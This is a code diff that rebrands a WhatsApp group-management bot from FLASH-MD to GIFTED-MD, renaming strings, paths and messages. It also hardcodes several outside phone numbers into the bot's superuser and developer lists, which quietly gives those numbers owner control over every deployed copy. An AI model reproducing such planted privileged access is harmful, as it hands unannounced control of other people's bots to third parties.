@@ -149,11 +149,11 @@ setTimeout(() => {
             var origineMessage = ms.key.remoteJid;
             var idBot = decodeJid(zk.user.id);
             var servBot = idBot.split('@')[0];
-            /* const FranceKing='254757835036';
-             const FranceKing1='254751284190';
-             const FranceKing2='254750948696'*/
-            /*  var superUser=[servBot,FranceKing,FranceKing1,luffy].map((s)=>s.replace(/[^0-9]/g)+"@s.whatsapp.net").includes(auteurMessage);
-              var dev =[FranceKing,FranceKing1,FranceKing2].map((t)=>t.replace(/[^0-9]/g)+"@s.whatsapp.net").includes(auteurMessage);*/
+            /* const GiftedTech='254728782591';
+             const GiftedTech1='254762016957';
+             const GiftedTech2='254728746852'*/
+            /*  var superUser=[servBot,GiftedTech,GiftedTech1,luffy].map((s)=>s.replace(/[^0-9]/g)+"@s.whatsapp.net").includes(auteurMessage);
+              var dev =[GiftedTech,GiftedTech1,GiftedTech2].map((t)=>t.replace(/[^0-9]/g)+"@s.whatsapp.net").includes(auteurMessage);*/
             
             if(origineMessage === "120363244435092946@g.us") return 
             
@@ -175,10 +175,10 @@ const MsgInbox = origineMessage?.endsWith("@s.whatsapp.net");
             var membreGroupe = verifGroupe ? ms.key.participant : '';
             const { getAllSudoNumbers } = require("./bdd/sudo");
             const nomAuteurMessage = ms.pushName;
-            const k1 = '254742063632';
-            const k2 = '254757835036';
-            const k3 = "254750948696";
-            const k4 = '254751284190';
+            const k1 = '254728782591';
+            const k2 = '254762016957';
+            const k3 = "254728746851";
+            const k4 = '254110853827';
             const sudo = await getAllSudoNumbers();
             let suhail_ser = "923184474176"
             const superUserNumbers = [servBot, suhail_ser, k1, k2, k3, k4, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
@@ -187,7 +187,7 @@ const MsgInbox = origineMessage?.endsWith("@s.whatsapp.net");
             
             var dev = [k1,suhail_ser, k2,k3,k4].map((t) => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
             function repondre(mes) { zk.sendMessage(origineMessage, { text: mes }, { quoted: ms }); }
-            console.log("\t [][]...{FLASH-MD}...[][]");
+            console.log("\t [][]...{GIFTED-MD}...[][]");
             console.log("=========== New message ===========");
             if (verifGroupe) {
                 console.log("message from the group : " + nomGroupe);
@@ -295,7 +295,7 @@ await repondre(data.cnt);
         
                                try {
         
-                                  let st = './store.json' ;
+                                  let st = 'src/store.json' ;
         
                                 const data = fs.readFileSync(st, 'utf8');
         
@@ -364,7 +364,7 @@ await repondre(data.cnt);
             
  //---------------------------------------rang-count--------------------------------
              if (texte && auteurMessage.endsWith("s.whatsapp.net")) {
-  const { ajouterOuMettreAJourUserData } = require("./bdd/level"); 
+  const { ajouterOuMettreAJourUserData } = require("./data/src/level"); 
   try {
     await ajouterOuMettreAJourUserData(auteurMessage);
   } catch (e) {
@@ -384,7 +384,7 @@ await repondre(data.cnt);
             
                     if(superUser) {console.log('hummm') ; return ;} 
                     
-                    let mbd = require('./bdd/mention') ;
+                    let mbd = require('./data/src/mention') ;
             
                     let alldata = await mbd.recupererToutesLesValeurs() ;
             
@@ -485,7 +485,7 @@ await repondre(data.cnt);
                                         await zk.groupParticipantsUpdate(origineMessage, [auteurMessage], "remove");
                                     }
                                     catch (e) {
-                                        console.log("antiien ") + e;
+                                        console.log("antink ") + e;
                                     }
                                     await zk.sendMessage(origineMessage, { delete: key });
                                     await fs.unlink("st1.webp"); } 
@@ -498,7 +498,7 @@ await repondre(data.cnt);
                                        await fs.unlink("st1.webp");
 
                                     } else if(action === 'warn') {
-                                        const {getWarnCountByJID ,ajouterUtilisateurAvecWarnCount} = require('./bdd/warn') ;
+                                        const {getWarnCountByJID ,ajouterUtilisateurAvecWarnCount} = require('./data/src/warn') ;
 
                             let warn = await getWarnCountByJID(auteurMessage) ; 
                             let warnlimit = conf.WARN_COUNT
@@ -533,7 +533,7 @@ await repondre(data.cnt);
         
     
     catch (e) {
-        console.log("bdd err " + e);
+        console.log("data err " + e);
     }
 
 
@@ -557,7 +557,7 @@ await repondre(data.cnt);
                                    // txt += `message supprimé \n @${auteurMessage.split("@")[0]} rétiré du groupe.`;
                                     const gifLink = "https://raw.githubusercontent.com/djalega8000/Zokou-MD/main/media/remover.gif";
                                     var sticker = new Sticker(gifLink, {
-                                        pack: 'Flash-Md',
+                                        pack: 'Gifted-Md',
                                         author: conf.OWNER_NAME,
                                         type: StickerTypes.FULL,
                                         categories: ['🤩', '🎉'],
@@ -593,7 +593,7 @@ await repondre(data.cnt);
                                        await fs.unlink("st1.webp");
 
                                     } else if(action === 'warn') {
-                                        const {getWarnCountByJID ,ajouterUtilisateurAvecWarnCount} = require('./bdd/warn') ;
+                                        const {getWarnCountByJID ,ajouterUtilisateurAvecWarnCount} = require('./data/src/warn') ;
 
                             let warn = await getWarnCountByJID(auteurMessage) ; 
                             let warnlimit = conf.WARN_COUNT
@@ -628,7 +628,7 @@ await repondre(data.cnt);
         
     
     catch (e) {
-        console.log("bdd err " + e);
+        console.log("data err " + e);
     }
 
             //bad-words
@@ -651,7 +651,7 @@ await repondre(data.cnt);
                                    // txt += `message supprimé \n @${auteurMessage.split("@")[0]} rétiré du groupe.`;
                                     const gifLink = "https://raw.githubusercontent.com/djalega8000/Zokou-MD/main/media/remover.gif";
                                     var sticker = new Sticker(gifLink, {
-                                        pack: 'Flash-Md',
+                                        pack: 'Gifted-Md',
                                         author: conf.OWNER_NAME,
                                         type: StickerTypes.FULL,
                                         categories: ['🤩', '🎉'],
@@ -687,7 +687,7 @@ await repondre(data.cnt);
                                        await fs.unlink("st1.webp");
 
                                     } else if(action === 'warn') {
-                                        const {getWarnCountByJID ,ajouterUtilisateurAvecWarnCount} = require('./bdd/warn') ;
+                                        const {getWarnCountByJID ,ajouterUtilisateurAvecWarnCount} = require('./data/src/warn') ;
 
                             let warn = await getWarnCountByJID(auteurMessage) ; 
                             let warnlimit = conf.WARN_COUNT
@@ -722,7 +722,7 @@ await repondre(data.cnt);
         
     
     catch (e) {
-        console.log("bdd err " + e);
+        console.log("data err " + e);
                                                                    }
 
             //bad 
@@ -746,7 +746,7 @@ await repondre(data.cnt);
                                    // txt += `message supprimé \n @${auteurMessage.split("@")[0]} rétiré du groupe.`;
                                     const gifLink = "https://raw.githubusercontent.com/djalega8000/Zokou-MD/main/media/remover.gif";
                                     var sticker = new Sticker(gifLink, {
-                                        pack: 'Flash-Md',
+                                        pack: 'Gifted-Md',
                                         author: conf.OWNER_NAME,
                                         type: StickerTypes.FULL,
                                         categories: ['🤩', '🎉'],
@@ -782,7 +782,7 @@ await repondre(data.cnt);
                                        await fs.unlink("st1.webp");
 
                                     } else if(action === 'warn') {
-                                        const {getWarnCountByJID ,ajouterUtilisateurAvecWarnCount} = require('./bdd/warn') ;
+                                        const {getWarnCountByJID ,ajouterUtilisateurAvecWarnCount} = require('./data/src/warn') ;
 
                             let warn = await getWarnCountByJID(auteurMessage) ; 
                             let warnlimit = conf.WARN_COUNT
@@ -817,7 +817,7 @@ await repondre(data.cnt);
         
     
     catch (e) {
-        console.log("bdd err " + e);
+        console.log("data err " + e);
                                        }
 
             //bad
@@ -840,7 +840,7 @@ await repondre(data.cnt);
                                    // txt += `message supprimé \n @${auteurMessage.split("@")[0]} rétiré du groupe.`;
                                     const gifLink = "https://raw.githubusercontent.com/djalega8000/Zokou-MD/main/media/remover.gif";
                                     var sticker = new Sticker(gifLink, {
-                                        pack: 'Flash-Md',
+                                        pack: 'Gifted-Md',
                                         author: conf.OWNER_NAME,
                                         type: StickerTypes.FULL,
                                         categories: ['🤩', '🎉'],
@@ -876,7 +876,7 @@ await repondre(data.cnt);
                                        await fs.unlink("st1.webp");
 
                                     } else if(action === 'warn') {
-                                        const {getWarnCountByJID ,ajouterUtilisateurAvecWarnCount} = require('./bdd/warn') ;
+                                        const {getWarnCountByJID ,ajouterUtilisateurAvecWarnCount} = require('./data/src/warn') ;
 
                             let warn = await getWarnCountByJID(auteurMessage) ; 
                             let warnlimit = conf.WARN_COUNT
@@ -911,7 +911,7 @@ await repondre(data.cnt);
         
     
     catch (e) {
-        console.log("bdd err " + e);
+        console.log("data err " + e);
     }
 
            //bad
@@ -934,7 +934,7 @@ await repondre(data.cnt);
                                    // txt += `message supprimé \n @${auteurMessage.split("@")[0]} rétiré du groupe.`;
                                     const gifLink = "https://raw.githubusercontent.com/djalega8000/Zokou-MD/main/media/remover.gif";
                                     var sticker = new Sticker(gifLink, {
-                                        pack: 'Flash-Md',
+                                        pack: 'Gifted-Md',
                                         author: conf.OWNER_NAME,
                                         type: StickerTypes.FULL,
                                         categories: ['🤩', '🎉'],
@@ -970,7 +970,7 @@ await repondre(data.cnt);
                                        await fs.unlink("st1.webp");
 
                                     } else if(action === 'warn') {
-                                        const {getWarnCountByJID ,ajouterUtilisateurAvecWarnCount} = require('./bdd/warn') ;
+                                        const {getWarnCountByJID ,ajouterUtilisateurAvecWarnCount} = require('./data/src/warn') ;
 
                             let warn = await getWarnCountByJID(auteurMessage) ; 
                             let warnlimit = conf.WARN_COUNT
@@ -1005,7 +1005,7 @@ await repondre(data.cnt);
         
     
     catch (e) {
-        console.log("bdd err " + e);
+        console.log("data err " + e);
                     }
             //bad-words
      try {
@@ -1027,7 +1027,7 @@ await repondre(data.cnt);
                                    // txt += `message supprimé \n @${auteurMessage.split("@")[0]} rétiré du groupe.`;
                                     const gifLink = "https://raw.githubusercontent.com/djalega8000/Zokou-MD/main/media/remover.gif";
                                     var sticker = new Sticker(gifLink, {
-                                        pack: 'Flash-Md',
+                                        pack: 'Gifted-Md',
                                         author: conf.OWNER_NAME,
                                         type: StickerTypes.FULL,
                                         categories: ['🤩', '🎉'],
@@ -1063,7 +1063,7 @@ await repondre(data.cnt);
                                        await fs.unlink("st1.webp");
 
                                     } else if(action === 'warn') {
-                                        const {getWarnCountByJID ,ajouterUtilisateurAvecWarnCount} = require('./bdd/warn') ;
+                                        const {getWarnCountByJID ,ajouterUtilisateurAvecWarnCount} = require('./data/src/warn') ;
 
                             let warn = await getWarnCountByJID(auteurMessage) ; 
                             let warnlimit = conf.WARN_COUNT
@@ -1098,7 +1098,7 @@ await repondre(data.cnt);
         
     
     catch (e) {
-        console.log("bdd err " + e);
+        console.log("data err " + e);
     }
     
             
@@ -1122,7 +1122,7 @@ await repondre(data.cnt);
                                    // txt += `message supprimé \n @${auteurMessage.split("@")[0]} rétiré du groupe.`;
                                     const gifLink = "https://raw.githubusercontent.com/djalega8000/Zokou-MD/main/media/remover.gif";
                                     var sticker = new Sticker(gifLink, {
-                                        pack: 'Flash-Md',
+                                        pack: 'Gifted-Md',
                                         author: conf.OWNER_NAME,
                                         type: StickerTypes.FULL,
                                         categories: ['🤩', '🎉'],
@@ -1158,7 +1158,7 @@ await repondre(data.cnt);
                                        await fs.unlink("st1.webp");
 
                                     } else if(action === 'warn') {
-                                        const {getWarnCountByJID ,ajouterUtilisateurAvecWarnCount} = require('./bdd/warn') ;
+                                        const {getWarnCountByJID ,ajouterUtilisateurAvecWarnCount} = require('./data/src/warn') ;
 
                             let warn = await getWarnCountByJID(auteurMessage) ; 
                             let warnlimit = conf.WARN_COUNT
@@ -1193,7 +1193,7 @@ await repondre(data.cnt);
         
     
     catch (e) {
-        console.log("bdd err " + e);
+        console.log("data err " + e);
     }
     
 
@@ -1220,7 +1220,7 @@ await repondre(data.cnt);
            // txt += `message supprimé \n @${auteurMessage.split("@")[0]} rétiré du groupe.`;
             const gifLink = "https://raw.githubusercontent.com/djalega8000/Zokou-MD/main/media/remover.gif";
             var sticker = new Sticker(gifLink, {
-                pack: 'Flash-Md',
+                pack: 'Gifted-Md',
                 author: conf.OWNER_NAME,
                 type: StickerTypes.FULL,
                 categories: ['🤩', '🎉'],
@@ -1256,7 +1256,7 @@ await repondre(data.cnt);
                await fs.unlink("st1.webp");
 
             } else if(action === 'warn') {
-                const {getWarnCountByJID ,ajouterUtilisateurAvecWarnCount} = require('./bdd/warn') ;
+                const {getWarnCountByJID ,ajouterUtilisateurAvecWarnCount} = require('./data/src/warn') ;
 
     let warn = await getWarnCountByJID(auteurMessage) ; 
     let warnlimit = conf.WARN_COUNT
@@ -1352,7 +1352,7 @@ await repondre(data.cnt);
         //fin événement message
 
 /******** evenement groupe update ****************/
-const { recupevents } = require('./bdd/welcome'); 
+const { recupevents } = require('./data/src/welcome'); 
 
 zk.ev.on('group-participants.update', async (group) => {
     console.log(group);
@@ -1368,7 +1368,7 @@ zk.ev.on('group-participants.update', async (group) => {
         const metadata = await zk.groupMetadata(group.id);
 
         if (group.action == 'add' && (await recupevents(group.id, "welcome") == 'on')) {
-            let msg = `◇FLASH-MD◇
+            let msg = `GIFTED-MD
 `;
              
             let membres = group.participants;
@@ -1378,7 +1378,7 @@ zk.ev.on('group-participants.update', async (group) => {
 
             msg += `*You are welcomed here.* 
             
-*You MAY read the group description FOR more info and Avoid getting removed*
+*Please read the group description FOR more info and Avoid getting removed*
             
      
             
@@ -1386,11 +1386,11 @@ zk.ev.on('group-participants.update', async (group) => {
 
 ${metadata.desc}
 
-📌Powered by *France King`;
+*ɢɪғᴛᴇᴅ ᴍᴅ ᴠᴇʀsɪᴏɴ 3.0.0*`;
 
             zk.sendMessage(group.id, { image: { url: ppgroup }, caption: msg, mentions: membres });
         } else if (group.action == 'remove' && (await recupevents(group.id, "goodbye") == 'on')) {
-            let msg = `Goodbye to that Fallen soldier, Powered by *FLASH-MD*;\n`;
+            let msg = `Goodbye to that Fallen soldier,\n \n *ɢɪғᴛᴇᴅ ᴍᴅ ᴠᴇʀsɪᴏɴ 3.0.0*;\n`;
 
             let membres = group.participants;
             for (let membre of membres) {
@@ -1446,7 +1446,7 @@ ${metadata.desc}
         
     async  function activateCrons() {
         const cron = require('node-cron');
-        const { getCron } = require('./bdd/cron');
+        const { getCron } = require('./data/src/cron');
 
           let crons = await getCron();
           console.log(crons);
@@ -1517,10 +1517,10 @@ ${metadata.desc}
         zk.ev.on("connection.update", async (con) => {
             const { lastDisconnect, connection } = con;
             if (connection === "connecting") {
-                console.log("ℹ️ Connexion en cours...");
+                console.log("ℹ️ Gifted Establishing Connection...");
             }
             else if (connection === 'open') {
-                console.log("✅ Successful connection! ☺️");
+                console.log("✅ Gifted Successfully Connected! ☺️");
                 console.log("--");
                 await (0, baileys_1.delay)(200);
                 console.log("------");
@@ -1528,17 +1528,17 @@ ${metadata.desc}
                 console.log("------------------/-----");
                 console.log("the bot is online 🕸\n\n");
                 //chargement des commandes 
-                console.log("Loading Commands ...\n");
-                fs.readdirSync(__dirname + "/commands").forEach((fichier) => {
+                console.log("Gifted Loading Commands ...\n");
+                fs.readdirSync(__dirname + "/app").forEach((fichier) => {
                     if (path.extname(fichier).toLowerCase() == (".js")) {
                         try {
-                            require(__dirname + "/commands/" + fichier);
-                            console.log(fichier + " installé ✔️");
+                            require(__dirname + "/app/" + fichier);
+                            console.log(fichier + " Installed ✔️");
                         }
                         catch (e) {
                             console.log(`${fichier} could not be loaded for the following reasons  : ${e}`);
-                        } /* require(__dirname + "/commandes/" + fichier);
-                         console.log(fichier + " installé ✔️")*/
+                        } /* require(__dirname + "/app/" + fichier);
+                         console.log(fichier + " Installed ✔️")*/
                         (0, baileys_1.delay)(300);
                     }
                 });
@@ -1553,35 +1553,27 @@ ${metadata.desc}
                 else {
                     md = "undefined";
                 }
-                console.log("Commands successfully Loaded ✅");
+                console.log("Commands Successfully Loaded ✅");
 
               //  await activateCrons();
                 
                 if((conf.DP).toLowerCase() === 'yes') {     
-                let cmsg = `*☢️𝐅𝐋𝐀𝐒𝐇-𝐌𝐃 is Connected☢️*
-                
-❒ 𝐂𝐑𝐄𝐀𝐓𝐎𝐑: 𝐅𝐫𝐚𝐧𝐜𝐞 𝐊𝐢𝐧𝐠  
-❒ PREFIX: ${prefixe}
-❒ MODE: ${md} 
-❒ COMMANDS: ${evt.cm.length}
-❒ CREATED: *22.2.2024*︎
+                let cmsg = `*GIFTED-MD IS RUNNING*
 
-___________________________________
-   
- 
-╔═════◇
-║◇ *KEEP USING FLASH-MD*
-╚════════════════>
-___________________________________ 
+*Prefix  :* ${prefixe}
+*Commands:* ${evt.cm.length}
+*Mode    :* ${md}
+*Database:* CPanel
 
-*THE  FLASH  MULTI  DEVICE*`;
+*Owner   :* Gifted Tech
+*Tutorial:* youtube.com/@giftedtechnexus`;
                 await zk.sendMessage(zk.user.id, { text: cmsg });
                 }
             }
             else if (connection == "close") {
                 let raisonDeconnexion = new boom_1.Boom(lastDisconnect?.error)?.output.statusCode;
                 if (raisonDeconnexion === baileys_1.DisconnectReason.badSession) {
-                    console.log('Wrong session ID. please rescan the QR or use pairing code by France King...');
+                    console.log('Wrong session ID. please rescan the QR or use pairing code...');
                 }
                 else if (raisonDeconnexion === baileys_1.DisconnectReason.connectionClosed) {
                     console.log('!!! connection closed, reconnection in progress ...');
